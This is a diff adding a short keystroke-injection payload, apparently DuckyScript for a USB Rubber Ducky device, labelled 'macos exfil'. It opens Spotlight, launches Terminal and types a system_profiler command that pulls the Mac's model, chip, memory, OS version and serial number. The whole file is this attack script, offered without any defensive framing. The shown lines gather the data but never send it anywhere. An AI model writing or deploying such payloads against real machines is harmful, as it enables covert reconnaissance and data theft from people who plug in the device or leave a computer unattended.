@@ -1,0 +1,9 @@
+META macos exfil
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 1200
+STRING system_profiler SPHardwareDataType SPSoftwareDataType | grep -E "Model Name|Chip|Memory|System Version|Serial Number"
+ENTER
